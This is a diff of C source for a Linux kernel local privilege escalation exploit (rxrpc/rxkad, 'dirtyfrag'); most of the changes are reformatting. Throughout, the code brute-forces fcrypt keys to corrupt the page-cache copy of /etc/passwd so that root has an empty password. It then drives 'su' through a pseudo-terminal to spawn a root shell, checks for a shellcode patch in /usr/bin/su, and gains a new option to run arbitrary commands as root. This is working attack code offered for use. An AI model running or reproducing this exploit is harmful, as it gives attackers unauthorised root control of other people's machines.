-				((uint32_t)fc_sbox1_raw[i] >> 5));
+			((uint32_t)fc_sbox1_raw[i] >> 5));
 		fc_sbox2[i] = htobe32((uint32_t)fc_sbox2_raw[i] << 11);
 		fc_sbox3[i] = htobe32((uint32_t)fc_sbox3_raw[i] << 19);
 	}
@@ -1044,10 +1023,9 @@ static void fcrypt_init_sboxes(void)
 
 typedef struct { uint32_t sched[16]; } fcrypt_uctx;
 
-static void fcrypt_user_setkey(fcrypt_uctx *ctx, const uint8_t key[8])
-{
+static void fcrypt_user_setkey(fcrypt_uctx* ctx, const uint8_t key[8]) {
 	uint64_t k = 0;
-	k  = (uint64_t)(key[0] >> 1);
+	k = (uint64_t)(key[0] >> 1);
 	k <<= 7; k |= (uint64_t)(key[1] >> 1);
 	k <<= 7; k |= (uint64_t)(key[2] >> 1);
 	k <<= 7; k |= (uint64_t)(key[3] >> 1);
@@ -1081,9 +1059,8 @@ static void fcrypt_user_setkey(fcrypt_uctx *ctx, const uint8_t key[8])
 	fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];                           \
 } while (0)
 
-static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
-		uint8_t out[8], const uint8_t in[8])
-{
+static void fcrypt_user_decrypt(const fcrypt_uctx* ctx,
+	uint8_t out[8], const uint8_t in[8]) {
 	uint32_t L, R;
 	memcpy(&L, in, 4);
 	memcpy(&R, in + 4, 4);
@@ -1142,18 +1119,15 @@ static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
  * The constraints on P_A[2..7] and P_B[2..7] are vacuous because they
  * are overwritten before /etc/passwd is read by anyone — we only care
  * about the final state. */
-static inline int fc_check_pa_nullok(const uint8_t P[8])
-{
+static inline int fc_check_pa_nullok(const uint8_t P[8]) {
 	return P[0] == ':' && P[1] == ':';
 }
 
-static inline int fc_check_pb_nullok(const uint8_t P[8])
-{
+static inline int fc_check_pb_nullok(const uint8_t P[8]) {
 	return P[0] == '0' && P[1] == ':';
 }
 
-static inline int fc_check_pc_nullok(const uint8_t P[8])
-{
+static inline int fc_check_pc_nullok(const uint8_t P[8]) {
 	if (P[0] != '0') return 0;
 	if (P[1] != ':') return 0;
 	if (P[7] != ':') return 0;
@@ -1163,8 +1137,7 @@ static inline int fc_check_pc_nullok(const uint8_t P[8])
 	return 1;
 }
 
-static uint64_t fc_splitmix64(uint64_t *s)
-{
+static uint64_t fc_splitmix64(uint64_t* s) {
 	uint64_t z = (*s += 0x9E3779B97F4A7C15ULL);
 	z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
 	z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
@@ -1175,11 +1148,10 @@ static uint64_t fc_splitmix64(uint64_t *s)
 typedef int (*pcheck_fn)(const uint8_t P[8]);
 
 static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
-		pcheck_fn check,
-		uint8_t K_out[8], uint8_t P_out[8],
-		uint64_t seed_init,
-		const char *label)
-{
+	pcheck_fn check,
+	uint8_t K_out[8], uint8_t P_out[8],
+	uint64_t seed_init,
+	const char* label) {
 	fcrypt_uctx ctx;
 	uint8_t K[8], P[8];
 	uint64_t seed = seed_init;
@@ -1199,18 +1171,18 @@ static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
 			double dt = (ts1.tv_sec - ts0.tv_sec) +
 				(ts1.tv_nsec - ts0.tv_nsec) / 1e9;
 			LOG("%s found after %lu iters in %.2fs (%.2fM/s) K=%02x%02x%02x%02x%02x%02x%02x%02x  P=%02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
-					label,
-					(unsigned long)iter, dt, iter / dt / 1e6,
-					K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],
-					P[0],P[1],P[2],P[3],P[4],P[5],P[6],P[7],
-					(P[0]>=32&&P[0]<127)?P[0]:'.',
-					(P[1]>=32&&P[1]<127)?P[1]:'.',
-					(P[2]>=32&&P[2]<127)?P[2]:'.',
-					(P[3]>=32&&P[3]<127)?P[3]:'.',
-					(P[4]>=32&&P[4]<127)?P[4]:'.',
-					(P[5]>=32&&P[5]<127)?P[5]:'.',
-					(P[6]>=32&&P[6]<127)?P[6]:'.',
-					(P[7]>=32&&P[7]<127)?P[7]:'.');
+				label,
+				(unsigned long)iter, dt, iter / dt / 1e6,
+				K[0], K[1], K[2], K[3], K[4], K[5], K[6], K[7],
+				P[0], P[1], P[2], P[3], P[4], P[5], P[6], P[7],
+				(P[0] >= 32 && P[0] < 127) ? P[0] : '.',
+				(P[1] >= 32 && P[1] < 127) ? P[1] : '.',
+				(P[2] >= 32 && P[2] < 127) ? P[2] : '.',
+				(P[3] >= 32 && P[3] < 127) ? P[3] : '.',
+				(P[4] >= 32 && P[4] < 127) ? P[4] : '.',
+				(P[5] >= 32 && P[5] < 127) ? P[5] : '.',
+				(P[6] >= 32 && P[6] < 127) ? P[6] : '.',
+				(P[7] >= 32 && P[7] < 127) ? P[7] : '.');
 			return 0;
 		}
 
@@ -1219,23 +1191,22 @@ static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
 			double dt = (ts1.tv_sec - ts0.tv_sec) +
 				(ts1.tv_nsec - ts0.tv_nsec) / 1e9;
 			fprintf(stderr, "  [%s %.1fs] iter=%lu (%.2fM/s)\n",
-					label, dt, (unsigned long)iter, iter / dt / 1e6);
+				label, dt, (unsigned long)iter, iter / dt / 1e6);
 		}
 	}
 	return -1;
 }
 
 
-int rxrpc_lpe_main(int argc, char **argv)
-{
+int rxrpc_lpe_main(int argc, char** argv) {
 	fprintf(stderr, "\n=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root) ===\n");
 	fprintf(stderr, "[*] uid=%u euid=%u gid=%u\n",
-			getuid(), geteuid(), getgid());
+		getuid(), geteuid(), getgid());
 
 	{
-		const char *no_unshare = getenv("POC_NO_UNSHARE");
+		const char* no_unshare = getenv("POC_NO_UNSHARE");
 		if (!no_unshare || *no_unshare != '1') {
-			const char *do_unshare = getenv("POC_UNSHARE");
+			const char* do_unshare = getenv("POC_UNSHARE");
 			if (do_unshare && *do_unshare == '1') {
 				if (do_unshare_userns_netns() < 0) return 1;
 			}
@@ -1258,7 +1229,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 
 	/* Open /etc/passwd RO and mmap the first page (which contains the
 	 * root entry on line 1). */
-	const char *target_path = getenv("POC_TARGET_FILE");
+	const char* target_path = getenv("POC_TARGET_FILE");
 	if (!target_path || !*target_path) target_path = "/etc/passwd";
 
 	int rfd_ro = open(target_path, O_RDONLY);
@@ -1270,11 +1241,11 @@ int rxrpc_lpe_main(int argc, char **argv)
 	fstat(rfd_ro, &st);
 	if (st.st_size < 32) { WARN("target too small: %lld", (long long)st.st_size); return 1; }
 	LOG("target %s opened RO, size=%lld, uid=%u gid=%u mode=%04o",
-			target_path, (long long)st.st_size, st.st_uid, st.st_gid,
-			st.st_mode & 07777);
+		target_path, (long long)st.st_size, st.st_uid, st.st_gid,
+		st.st_mode & 07777);
 
 	/* mmap first page so the page-cache page stays pinned. */
-	void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
+	void* map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
 	if (map == MAP_FAILED) { WARN("mmap: %s", strerror(errno)); return 1; }
 	LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)", target_path, map);
 
@@ -1285,7 +1256,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 	 * currently at offsets 4/6/8 of the page-cache page, so it works
 	 * even on the corrupt residue from a previous failed run. */
 	{
-		const char *m = (const char *)map;
+		const char* m = (const char*)map;
 		if (memcmp(m, "root::0:0", 9) == 0) {
 			LOG("/etc/passwd already patched (root::0:0...) — nothing to do");
 			return 0;
@@ -1297,7 +1268,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 	}
 	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) BEFORE: '");
 	for (int i = 0; i < 32; i++) {
-		char c = ((const char *)map)[i];
+		char c = ((const char*)map)[i];
 		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
 	}
 	fprintf(stderr, "'\n");
@@ -1323,29 +1294,29 @@ int rxrpc_lpe_main(int argc, char **argv)
 	if (pread(rfd_ro, Cc, 8, off_c) != 8) { WARN("pread Cc: %s", strerror(errno)); return 1; }
 
 	LOG("Ca @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
-			off_a, Ca[0],Ca[1],Ca[2],Ca[3],Ca[4],Ca[5],Ca[6],Ca[7],
-			(Ca[0]>=32&&Ca[0]<127)?Ca[0]:'.', (Ca[1]>=32&&Ca[1]<127)?Ca[1]:'.',
-			(Ca[2]>=32&&Ca[2]<127)?Ca[2]:'.', (Ca[3]>=32&&Ca[3]<127)?Ca[3]:'.',
-			(Ca[4]>=32&&Ca[4]<127)?Ca[4]:'.', (Ca[5]>=32&&Ca[5]<127)?Ca[5]:'.',
-			(Ca[6]>=32&&Ca[6]<127)?Ca[6]:'.', (Ca[7]>=32&&Ca[7]<127)?Ca[7]:'.');
+		off_a, Ca[0], Ca[1], Ca[2], Ca[3], Ca[4], Ca[5], Ca[6], Ca[7],
+		(Ca[0] >= 32 && Ca[0] < 127) ? Ca[0] : '.', (Ca[1] >= 32 && Ca[1] < 127) ? Ca[1] : '.',
+		(Ca[2] >= 32 && Ca[2] < 127) ? Ca[2] : '.', (Ca[3] >= 32 && Ca[3] < 127) ? Ca[3] : '.',
+		(Ca[4] >= 32 && Ca[4] < 127) ? Ca[4] : '.', (Ca[5] >= 32 && Ca[5] < 127) ? Ca[5] : '.',
+		(Ca[6] >= 32 && Ca[6] < 127) ? Ca[6] : '.', (Ca[7] >= 32 && Ca[7] < 127) ? Ca[7] : '.');
 	LOG("Cb @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
-			off_b, Cb[0],Cb[1],Cb[2],Cb[3],Cb[4],Cb[5],Cb[6],Cb[7],
-			(Cb[0]>=32&&Cb[0]<127)?Cb[0]:'.', (Cb[1]>=32&&Cb[1]<127)?Cb[1]:'.',
-			(Cb[2]>=32&&Cb[2]<127)?Cb[2]:'.', (Cb[3]>=32&&Cb[3]<127)?Cb[3]:'.',
-			(Cb[4]>=32&&Cb[4]<127)?Cb[4]:'.', (Cb[5]>=32&&Cb[5]<127)?Cb[5]:'.',
-			(Cb[6]>=32&&Cb[6]<127)?Cb[6]:'.', (Cb[7]>=32&&Cb[7]<127)?Cb[7]:'.');
+		off_b, Cb[0], Cb[1], Cb[2], Cb[3], Cb[4], Cb[5], Cb[6], Cb[7],
+		(Cb[0] >= 32 && Cb[0] < 127) ? Cb[0] : '.', (Cb[1] >= 32 && Cb[1] < 127) ? Cb[1] : '.',
+		(Cb[2] >= 32 && Cb[2] < 127) ? Cb[2] : '.', (Cb[3] >= 32 && Cb[3] < 127) ? Cb[3] : '.',
+		(Cb[4] >= 32 && Cb[4] < 127) ? Cb[4] : '.', (Cb[5] >= 32 && Cb[5] < 127) ? Cb[5] : '.',
+		(Cb[6] >= 32 && Cb[6] < 127) ? Cb[6] : '.', (Cb[7] >= 32 && Cb[7] < 127) ? Cb[7] : '.');
 	LOG("Cc @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
-			off_c, Cc[0],Cc[1],Cc[2],Cc[3],Cc[4],Cc[5],Cc[6],Cc[7],
-			(Cc[0]>=32&&Cc[0]<127)?Cc[0]:'.', (Cc[1]>=32&&Cc[1]<127)?Cc[1]:'.',
-			(Cc[2]>=32&&Cc[2]<127)?Cc[2]:'.', (Cc[3]>=32&&Cc[3]<127)?Cc[3]:'.',
-			(Cc[4]>=32&&Cc[4]<127)?Cc[4]:'.', (Cc[5]>=32&&Cc[5]<127)?Cc[5]:'.',
-			(Cc[6]>=32&&Cc[6]<127)?Cc[6]:'.', (Cc[7]>=32&&Cc[7]<127)?Cc[7]:'.');
+		off_c, Cc[0], Cc[1], Cc[2], Cc[3], Cc[4], Cc[5], Cc[6], Cc[7],
+		(Cc[0] >= 32 && Cc[0] < 127) ? Cc[0] : '.', (Cc[1] >= 32 && Cc[1] < 127) ? Cc[1] : '.',
+		(Cc[2] >= 32 && Cc[2] < 127) ? Cc[2] : '.', (Cc[3] >= 32 && Cc[3] < 127) ? Cc[3] : '.',
+		(Cc[4] >= 32 && Cc[4] < 127) ? Cc[4] : '.', (Cc[5] >= 32 && Cc[5] < 127) ? Cc[5] : '.',
+		(Cc[6] >= 32 && Cc[6] < 127) ? Cc[6] : '.', (Cc[7] >= 32 && Cc[7] < 127) ? Cc[7] : '.');
 
 	fcrypt_init_sboxes();
 	/* selftest */
 	{
 		fcrypt_uctx ctx;
-		uint8_t z[8] = {0};
+		uint8_t z[8] = { 0 };
 		uint8_t cv[8] = { 0x0E, 0x09, 0x00, 0xC7, 0x3E, 0xF7, 0xED, 0x41 };
 		uint8_t pv[8];
 		fcrypt_user_setkey(&ctx, z);
@@ -1361,15 +1332,15 @@ int rxrpc_lpe_main(int argc, char **argv)
 
 	{
 		uint64_t max_iters = 10000000000ULL;
-		const char *e = getenv("LPE_MAX_ITERS");
+		const char* e = getenv("LPE_MAX_ITERS");
 		if (e) max_iters = strtoull(e, NULL, 0);
 		uint64_t seed_base = (uint64_t)time(NULL) * 0x100000001ULL ^ (uint64_t)getpid();
-		const char *se = getenv("LPE_SEED");
+		const char* se = getenv("LPE_SEED");
 		if (se) seed_base = strtoull(se, NULL, 0);
 
 		fprintf(stderr, "\n=== STAGE 1a: search K_A (chars 4-5 := \"::\")  prob ~1.5e-5 ===\n");
 		if (find_K_offline_generic(Ca, max_iters, fc_check_pa_nullok,
-					Ka, Pa_out, seed_base, "K_A") != 0) {
+			Ka, Pa_out, seed_base, "K_A") != 0) {
 			WARN("K_A search exhausted"); return 2;
 		}
 
@@ -1381,13 +1352,13 @@ int rxrpc_lpe_main(int argc, char **argv)
 		memcpy(Cb_actual, Pa_out + 2, 6);
 		memcpy(Cb_actual + 6, Cb + 6, 2);
 		LOG("Cb_actual (after splice A) = %02x%02x%02x%02x%02x%02x%02x%02x",
-				Cb_actual[0],Cb_actual[1],Cb_actual[2],Cb_actual[3],
-				Cb_actual[4],Cb_actual[5],Cb_actual[6],Cb_actual[7]);
+			Cb_actual[0], Cb_actual[1], Cb_actual[2], Cb_actual[3],
+			Cb_actual[4], Cb_actual[5], Cb_actual[6], Cb_actual[7]);
 
 		fprintf(stderr, "\n=== STAGE 1b: search K_B (chars 6-7 := \"0:\")  prob ~1.5e-5 ===\n");
 		if (find_K_offline_generic(Cb_actual, max_iters, fc_check_pb_nullok,
-					Kb, Pb_out, seed_base ^ 0xa5a5a5a5a5a5a5a5ULL,
-					"K_B") != 0) {
+			Kb, Pb_out, seed_base ^ 0xa5a5a5a5a5a5a5a5ULL,
+			"K_B") != 0) {
 			WARN("K_B search exhausted"); return 2;
 		}
 
@@ -1397,24 +1368,24 @@ int rxrpc_lpe_main(int argc, char **argv)
 		memcpy(Cc_actual, Pb_out + 2, 6);
 		memcpy(Cc_actual + 6, Cc + 6, 2);
 		LOG("Cc_actual (after splice B) = %02x%02x%02x%02x%02x%02x%02x%02x",
-				Cc_actual[0],Cc_actual[1],Cc_actual[2],Cc_actual[3],
-				Cc_actual[4],Cc_actual[5],Cc_actual[6],Cc_actual[7]);
+			Cc_actual[0], Cc_actual[1], Cc_actual[2], Cc_actual[3],
+			Cc_actual[4], Cc_actual[5], Cc_actual[6], Cc_actual[7]);
 
 		fprintf(stderr, "\n=== STAGE 1c: search K_C (chars 8-15 := \"0:GGGGGG:\")  prob ~5.4e-8 ===\n");
 		if (find_K_offline_generic(Cc_actual, max_iters, fc_check_pc_nullok,
-					Kc, Pc_out, seed_base ^ 0x5a5a5a5a5a5a5a5aULL,
-					"K_C") != 0) {
+			Kc, Pc_out, seed_base ^ 0x5a5a5a5a5a5a5a5aULL,
+			"K_C") != 0) {
 			WARN("K_C search exhausted"); return 2;
 		}
 	}
 
 	fprintf(stderr, "\n[+] Predicted post-corruption /etc/passwd line 1:\n    \"root");
 	/* chars 4-5 from P_A */
-	for (int i = 0; i < 2; i++) fputc((Pa_out[i]>=32&&Pa_out[i]<127)?Pa_out[i]:'.', stderr);
+	for (int i = 0; i < 2; i++) fputc((Pa_out[i] >= 32 && Pa_out[i] < 127) ? Pa_out[i] : '.', stderr);
 	/* chars 6-7 from P_B */
-	for (int i = 0; i < 2; i++) fputc((Pb_out[i]>=32&&Pb_out[i]<127)?Pb_out[i]:'.', stderr);
+	for (int i = 0; i < 2; i++) fputc((Pb_out[i] >= 32 && Pb_out[i] < 127) ? Pb_out[i] : '.', stderr);
 	/* chars 8-15 from P_C */
-	for (int i = 0; i < 8; i++) fputc((Pc_out[i]>=32&&Pc_out[i]<127)?Pc_out[i]:'.', stderr);
+	for (int i = 0; i < 8; i++) fputc((Pc_out[i] >= 32 && Pc_out[i] < 127) ? Pc_out[i] : '.', stderr);
 	fprintf(stderr, "/root:/bin/bash\"\n");
 
 	/* === STAGE 2 — THREE KERNEL TRIGGERS (in order A → B → C) ===
@@ -1443,30 +1414,30 @@ int rxrpc_lpe_main(int argc, char **argv)
 	/* Verify: re-read line 1 of /etc/passwd via mmap. */
 	fprintf(stderr, "[*] /etc/passwd line 1 (root entry) AFTER:  '");
 	for (int i = 0; i < 32; i++) {
-		char c = ((const char *)map)[i];
+		char c = ((const char*)map)[i];
 		fputc((c == '\n') ? '$' : (c >= 32 && c < 127 ? c : '.'), stderr);
 	}
 	fprintf(stderr, "'\n");
 
 	/* Sanity-check: chars 4-5 = "::", 6-7 = "0:", 8-9 = "0:", 15 = ':'. */
 	{
-		const char *m = (const char *)map;
+		const char* m = (const char*)map;
 		int ok = (m[4] == ':' && m[5] == ':' &&
-				m[6] == '0' && m[7] == ':' &&
-				m[8] == '0' && m[9] == ':' &&
-				m[15] == ':');
+			m[6] == '0' && m[7] == ':' &&
+			m[8] == '0' && m[9] == ':' &&
+			m[15] == ':');
 		if (!ok) {
 			WARN("post-trigger sanity check failed — char layout off");
 			return 4;
 		}
 	}
 	fprintf(stderr,
-			"\n[!!!] HIT — root entry now has empty passwd field, uid=0, "
-			"gid=0, dir=/root, shell=/bin/bash.\n");
+		"\n[!!!] HIT — root entry now has empty passwd field, uid=0, "
+		"gid=0, dir=/root, shell=/bin/bash.\n");
 
 	/* === STAGE 3 — VERIFY VIA getent passwd root === */
 	fprintf(stderr,
-			"\n=== STAGE 3: independent verify via `getent passwd root` ===\n");
+		"\n=== STAGE 3: independent verify via `getent passwd root` ===\n");
 	{
 		int p[2];
 		if (pipe(p) == 0) {
@@ -1490,8 +1461,8 @@ int rxrpc_lpe_main(int argc, char **argv)
 				fprintf(stderr, "[getent passwd root] %s", buf);
 			}
 			fprintf(stderr,
-					"[+] PRIMITIVE proven: root entry has empty passwd field "
-					"via NSS.\n");
+				"[+] PRIMITIVE proven: root entry has empty passwd field "
+				"via NSS.\n");
 		}
 	}
 
@@ -1502,7 +1473,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 		int co_flag = 0;
 		for (int i = 1; i < argc; i++)
 			if (!strcmp(argv[i], "--corrupt-only")) { co_flag = 1; break; }
-		const char *e = getenv("DIRTYFRAG_CORRUPT_ONLY");
+		const char* e = getenv("DIRTYFRAG_CORRUPT_ONLY");
 		if (e && *e == '1') co_flag = 1;
 		if (co_flag) return 0;
 	}
@@ -1514,8 +1485,8 @@ int rxrpc_lpe_main(int argc, char **argv)
 	 * single newline on the "Password:" prompt and then bridge the
 	 * resulting bash to the user's tty. */
 	fprintf(stderr,
-			"\n=== STAGE 4: spawning interactive root shell via `su` "
-			"(no password input needed) ===\n\n");
+		"\n=== STAGE 4: spawning interactive root shell via `su` "
+		"(no password input needed) ===\n\n");
 	fflush(stderr);
 
 	int master = posix_openpt(O_RDWR | O_NOCTTY);
@@ -1523,7 +1494,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 		WARN("posix_openpt: %s", strerror(errno));
 		return 5;
 	}
-	char *slave_name = ptsname(master);
+	char* slave_name = ptsname(master);
 
 	struct winsize ws;
 	if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0) {
@@ -1564,7 +1535,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 	 * (e.g. when stdin is /dev/null in CI). */
 	int auto_verify = 0;
 	{
-		const char *e = getenv("LPE_AUTO_VERIFY");
+		const char* e = getenv("LPE_AUTO_VERIFY");
 		if (e && *e == '1') auto_verify = 1;
 	}
 	int verify_sent = 0;
@@ -1673,8 +1644,8 @@ int rxrpc_lpe_main(int argc, char **argv)
 #include <sys/types.h>
 #include <stdint.h>
 
-extern int su_lpe_main(int argc, char **argv);
-extern int rxrpc_lpe_main(int argc, char **argv);
+extern int su_lpe_main(int argc, char** argv);
+extern int rxrpc_lpe_main(int argc, char** argv);
 
 /*
  * The 8 bytes our su payload places at file offset 0x78 — the first
@@ -1693,8 +1664,7 @@ static const uint8_t su_marker[8] = {
 	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
 };
 
-static int su_already_patched(void)
-{
+static int su_already_patched(void) {
 	int fd = open("/usr/bin/su", O_RDONLY);
 	if (fd < 0)
 		return 0;
@@ -1706,8 +1676,7 @@ static int su_already_patched(void)
 	return memcmp(got, su_marker, sizeof(su_marker)) == 0;
 }
 
-static int passwd_already_patched(void)
-{
+static int passwd_already_patched(void) {
 	int fd = open("/etc/passwd", O_RDONLY);
 	if (fd < 0)
 		return 0;
@@ -1719,13 +1688,11 @@ static int passwd_already_patched(void)
 	return memcmp(head, "root::0:0", 9) == 0;
 }
 
-static int either_target_patched(void)
-{
+static int either_target_patched(void) {
 	return su_already_patched() || passwd_already_patched();
 }
 
-static void silence_stderr(int *saved_fd)
-{
+static void silence_stderr(int* saved_fd) {
 	*saved_fd = dup(STDERR_FILENO);
 	int dn = open("/dev/null", O_WRONLY);
 	if (dn >= 0) {
@@ -1734,18 +1701,16 @@ static void silence_stderr(int *saved_fd)
 	}
 }
 
-static void restore_stderr(int saved_fd)
-{
+static void restore_stderr(int saved_fd) {
 	if (saved_fd >= 0) {
 		dup2(saved_fd, STDERR_FILENO);
 		close(saved_fd);
 	}
 }
 
-static char **append_corrupt_only(int argc, char **argv, int *new_argc)
-{
-	static char *flag = "--corrupt-only";
-	static char *buf[64];
+static char** append_corrupt_only(int argc, char** argv, int* new_argc) {
+	static char* flag = "--corrupt-only";
+	static char* buf[64];
 	int n = argc < 60 ? argc : 60;
 	for (int i = 0; i < n; i++)
 		buf[i] = argv[i];
@@ -1755,21 +1720,19 @@ static char **append_corrupt_only(int argc, char **argv, int *new_argc)
 	return buf;
 }
 
-static void exec_su_login(void)
-{
-	const char *paths[] = {
+static void exec_su_login(void) {
+	const char* paths[] = {
 		"/bin/su", "/usr/bin/su", "/sbin/su", "/usr/sbin/su", NULL,
 	};
 	for (int i = 0; paths[i]; i++)
-		execl(paths[i], "su", "-", (char *)NULL);
-	execlp("su", "su", "-", (char *)NULL);
+		execl(paths[i], "su", "-", (char*)NULL);
+	execlp("su", "su", "-", (char*)NULL);
 }
 
 /*
  * Spawn `/usr/bin/su -` in a fresh PTY and bridge our tty to it.
  */
-static int run_root_pty(void)
-{
+static int run_root_pty(void) {
 	int master = posix_openpt(O_RDWR | O_NOCTTY);
 	if (master < 0)
 		return -1;
@@ -1777,7 +1740,7 @@ static int run_root_pty(void)
 		close(master);
 		return -1;
 	}
-	char *slave_name = ptsname(master);
+	char* slave_name = ptsname(master);
 	if (!slave_name) {
 		close(master);
 		return -1;
@@ -1811,7 +1774,7 @@ static int run_root_pty(void)
 	signal(SIGTTOU, SIG_IGN);
 	signal(SIGTTIN, SIG_IGN);
 	signal(SIGPIPE, SIG_IGN);
-	signal(SIGHUP,  SIG_IGN);
+	signal(SIGHUP, SIG_IGN);
 	(void)setpgid(0, 0);
 	(void)tcsetpgrp(STDIN_FILENO, getpid());
 
@@ -1849,7 +1812,7 @@ static int run_root_pty(void)
 			if (!auto_pw_sent && n < (ssize_t)sizeof(buf)) {
 				buf[n] = 0;
 				if (strstr(buf, "Password") ||
-						strstr(buf, "password")) {
+					strstr(buf, "password")) {
 					(void)write(master, "\n", 1);
 					auto_pw_sent = 1;
 				}
@@ -1892,28 +1855,44 @@ static int run_root_pty(void)
 	return 0;
 }
 
-int main(int argc, char **argv)
-{
+int main(int argc, char** argv) {
 	int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
 	int force_esp = 0, force_rxrpc = 0;
 	int saved_err = -1;
 	int rc = 1;
 	int new_argc;
-	char **co_argv;
+	char** co_argv;
+	int exec_start = 0;
 
 	for (int i = 1; i < argc; i++) {
-		if (!strcmp(argv[i], "--force-esp"))
+		if (exec_start == 0 && !strcmp(argv[i], "--")) {
+			if (i < argc - 1) {
+				exec_start = i + 1;
+			}
+		} else if (!strcmp(argv[i], "--force-esp"))
 			force_esp = 1;
 		else if (!strcmp(argv[i], "--force-rxrpc"))
 			force_rxrpc = 1;
 		else if (!strcmp(argv[i], "-v") ||
-				!strcmp(argv[i], "--verbose"))
+			!strcmp(argv[i], "--verbose"))
 			verbose = 1;
 	}
 
+	int exec_argc = argc - exec_start + 1;
+	char* exec_args[exec_argc];
+	for (int j = 0; j < exec_argc - 1; j++) {
+		exec_args[j] = argv[j + exec_start];
+	}
+	exec_args[exec_argc - 1] = NULL;
+
 	if (getuid() == 0) {
-		execlp("/bin/bash", "bash", (char *)NULL);
-		_exit(1);
+		int status;
+		if (exec_start == 0) {
+			status = execvp(EXEC_PATH, (char* []) { EXEC_PATH, NULL });
+		} else {
+			status = execvp(exec_args[0], exec_args);
+		}
+		_exit(status == 0 ? 1 : status);
 	}
 
 	co_argv = append_corrupt_only(argc, argv, &new_argc);
